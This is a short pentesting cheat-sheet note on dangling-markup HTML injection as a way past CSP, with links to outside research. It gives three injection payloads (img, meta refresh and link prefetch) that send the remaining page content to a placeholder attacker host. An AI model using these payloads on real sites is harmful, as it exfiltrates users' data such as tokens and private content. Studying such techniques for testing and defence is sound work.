#csp #html_injection

This technique can be use to extract information from a user when an **HTML injection is found**.

## Resources
- https://book.hacktricks.xyz/pentesting-web/dangling-markup-html-scriptless-injection
- https://portswigger.net/research/evading-csp-with-dom-based-dangling-markup

## Example Dangling with low CSP
```html
<img src='http://[ATTACKER_IP]/log.php?HTML=
```

## Example Dangling with restrictive CSP :
```html
<meta http-equiv="refresh" content='0; url=http://[ATTACKER_IP]/log.php?text=
```

```html
<link rel="prefetch" href='http://[ATTACKER_IP]/?
```